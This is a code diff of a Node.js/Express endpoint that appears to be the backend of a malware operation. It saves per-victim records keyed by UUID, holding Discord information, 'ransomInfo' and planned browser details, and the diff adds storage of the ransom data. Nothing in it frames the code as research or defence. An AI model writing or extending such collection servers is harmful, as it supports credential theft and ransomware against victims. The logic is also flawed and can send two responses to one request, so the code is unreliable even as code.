@@ -11,6 +11,7 @@ router.get("/", (req, res) => {
 
 //TODO: Add only if user doesnt exist or user exists and the details sent dont
 //(if user exists and has discord details but you send browser details add them)
+//Sorry that this function is so big but im not good at javascript or node coding so...
 router.post("/", async (req, res) => {
   //console.log(req.body);
   console.log(
@@ -28,19 +29,36 @@ router.post("/", async (req, res) => {
   //If user is found, check for params and update missing info if possible
   if (foundUser) {
     console.log("user exists");
-    if (checkParam(req.body.discordInfo) && !foundUser.discordInfo) {
-      try {
-        console.log("updating user");
-        const updatedUser = await User.updateOne(
-          { UUID: req.body.UUID },
-          { $set: { discordInfo: req.body.discordInfo } }
-        );
-        res.sendStatus(200);
-      } catch (err) {
-        console.log(
-          `Error ${err} when updating user with UUID: ${req.body.UUID}`
-        );
-        res.sendStatus(500);
+    if (checkParam(req.body.discordInfo) || checkParam(req.body.ransomInfo)) {
+      if (!foundUser.discordInfo) {
+        try {
+          console.log("updating user");
+          const updatedUser = await User.updateOne(
+            { UUID: req.body.UUID },
+            { $set: { discordInfo: req.body.discordInfo } }
+          );
+          res.sendStatus(200);
+        } catch (err) {
+          console.log(
+            `Error ${err} when updating user with UUID: ${req.body.UUID}`
+          );
+          res.sendStatus(500);
+        }
+      }
+      if (!foundUser.ransomInfo) {
+        try {
+          console.log("updating user");
+          const updatedUser = await User.updateOne(
+            { UUID: req.body.UUID },
+            { $set: { ransomInfo: req.body.ransomInfo } }
+          );
+          res.sendStatus(200);
+        } catch (err) {
+          console.log(
+            `Error ${err} when updating user with UUID: ${req.body.UUID}`
+          );
+          res.sendStatus(500);
+        }
       }
     }
   } else {
@@ -53,6 +71,10 @@ router.post("/", async (req, res) => {
 
     if (checkParam(req.body.discordInfo)) {
       user.discordInfo = req.body.discordInfo;
+      save = true;
+    }
+    if (checkParam(req.body.ransomInfo)) {
+      user.ransomInfo = req.body.ransomInfo;
       save = true;
     }
     //Add checks for other stuff like browserInfo
